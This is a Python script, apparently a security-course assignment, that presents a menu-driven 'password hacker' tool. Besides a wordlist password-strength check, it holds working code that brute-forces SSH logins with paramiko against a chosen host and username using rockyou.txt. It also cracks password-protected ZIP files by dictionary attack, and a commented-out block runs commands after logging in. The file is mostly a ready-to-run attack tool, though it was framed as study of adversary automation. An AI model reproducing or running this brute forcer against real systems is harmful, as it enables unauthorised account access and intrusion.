#!/usr/bin/env python3
# Script: Ops 401 Class 16 Automated Brute Force Wordlist Attack Tool Part 3 of 3

# Author: Zachary Derrick                    
# Date of latest revision:  10/26/22    
# Purpose: The final installment of a custom tool that performs brute force attacks 
#          ...to better understand the types of automation employed by adversaries.

# Import Libraries
import time, getpass, paramiko, sys, os, socket, zipfile
from tqdm import tqdm

# for a fun line break
line = "\n-------------------------------------------------------------( ◣∀◢)ψ------------------\n"

# this tests the strength of a password              
def iterator():
    filepath = input("Please enter the filepath to your password dictionary:\n")  or "/home/zaxxon/rockyou.txt"
    file = open(filepath)
    line = file.readline()
    print(line)
    #Loop
    while line: 
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(.5)
        line = file.readline()
    file.close() 

# function to find and load up a password dictionary, here the default is "rockyou.txt"
def dictpath():
    passdict = input("Please enter the filepath to your password dictionary:\n") or "/home/zaxxon/rockyou.txt"
    return passdict

# CHECK PASSWORD STRENGTH
# this function asks the user for a password to check against the pw dictionary and allows to text until their heart's content
def safepassword(pathtodict):
    testpass = input("Enter password to check against password dictionary:\n")
    with open(pathtodict, encoding="latin1") as file:
        content = file.read()
        if testpass in content:
            print("That word is found in the atck dictionary.\n")
            retry = input("Would you like to test another password?\n(Yes/No)\n")
            if retry.lower() == "yes" or retry.lower() == "y":
                safepassword(pathtodict)
            elif retry.lower() == "no" or retry.lower() == "n":
                sys.exit("Welly, welly, welly, welly, welly, welly, well. ( ◣∀◢)ψ")
        else:
            print("Your word was not found in the atck dictionary.\n")
            continue_to_main_menu = input("Would you like to return to the main menu?")
            if continue_to_main_menu.lower() == "yes" or continue_to_main_menu.lower() == "y":
                main_menu()
            elif continue_to_main_menu.lower() == "no" or continue_to_main_menu.lower() == "n":
                sys.exit("Your password is safe with me. ( ◣∀◢)ψ")
            else: 
                print("Was that a yes or a no?")   

# SSH BRUTE FORCE
# this code was pieced together from: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# however, the code in that link was written in Python 2, so it's been adapted to Py3 and also put into a working function   
def Brute_Force_Prompt():
    try:
        global host, username, input_file
        host = input("[电脑主机] Enter Host to B.F.: ") or "10.0.0.181"
        username = input("[名] Enter SSH Username: ") or "zaxxon"
        input_file = input("[密码列表文件] Enter SSH Password File: ") or "/home/zaxxon/rockyou.txt"

        if os.path.exists(input_file) == False:
            print("\n[注意] File Path Does Not Exist. ( ◣∀◢)ψ ")
            sys.exit(4)
    except KeyboardInterrupt:
        print("\n\n[止] User Requested An Interrupt")
        sys.exit(3) 

    input_file = open(input_file, encoding="latin1")
    print("")
    for i in input_file.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(password)
            if response == 0:
                print("%s[名] User: %s [密码] Password Found: %s%s" % (line, username, password, line,))
                main_menu()
            elif response == 1:
                print("[名] User: %s [密码] Password: %s => Login Incorrect <=" % (username, password,))
            elif response == 2:
                print("[注意] Conection Could Not Be Established To Address: %s" % (host,))
        except Exception as e:
            print(e.message)
            pass
    input_file.close()

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except OSError as e:
        code = 2
    ssh.close()
    return code 

# ZIP SECTION
# the password list path you want to use, must be available in the current directory
def zip_file_crack():
    wordlist = dictpath()
# the zip file you want to crack its password
    zip_file = input("Please enter the filepath to the zip file you're trying to crack:\n") or "/home/zaxxon/useless_zip.zip"
    # initialize the Zip File object
    zip_file = zipfile.ZipFile(zip_file)
    # count the number of words in this wordlist
    number_of_words_in_word_dictionary = len(list(open(wordlist, "rb")))
    # print the total number of passwords
    print("Total passwords to test:", number_of_words_in_word_dictionary)
    
    with open(wordlist, "rb") as wordlist:
        for word in tqdm(wordlist, total=number_of_words_in_word_dictionary, unit="word"):
            try:
                zip_file.extractall(pwd=word.strip())
            except:
                continue
            else:
                print("[+] Password found:", word.decode().strip())
                return
    print("[!] Password not found, try other wordlist.")
     
def main_menu():
    choice ='0'
    print("\n⛧::::::::::Pa$$w0rd ☠️H҉A҉C҉K҉E҉R҉☠️::( ◣∀◢)ψ::::::::::⛧")
    print("Choose 1 to Check Password Strength")
    print("Choose 2 to Brute Force SSH")
    print("Choose 3 to Crack a ZIP File")
    # print("Choose 4 to ")
    # print("Choose 5 to ")
    # print("Choose 6 to ")
    print("Choose 0 to Quit Program")
    choice = input("\nWhat's it going to be then, eh?: ")
    if choice == "1":
        safepassword(dictpath())   
    elif choice == "2":
        Brute_Force_Prompt()
    elif choice == "3":
        zip_file_crack()
        continue_to_main_menu = input("\nWould you like to return to the main menu? y/n\n")
        if continue_to_main_menu.lower() == "yes" or continue_to_main_menu.lower() == "y":
            main_menu()
        elif continue_to_main_menu.lower() == "no" or continue_to_main_menu.lower() == "n":
            sys.exit("I know what you've been up to... ( ◣∀◢)ψ")
        else: 
            print("Was that a (y)es or a (n)o?")
    # elif choice == "4":
    #   
    # elif choice == "5":
    # 
    # elif choice == "6":
    #    
    elif choice == "0":
        sys.exit("\nNaughty, Naughty, Naughty You Sneaky ol'Ha☠or!")
    else:
        print("\nThat is not an option.")

while True:
    main_menu()



 

   






# try:
#     session.login(host, username, passwrd)
#     session.sendline("uptime")
#     session.prompt()
#     print(session.before) #print everything before the prompt
#     session.sendline("whoami")
#     session.prompt()
#     print(session.before)
#     session.sendline("ls -l")
#     session.prompt()
#     print(session.before)
#     session.logout()

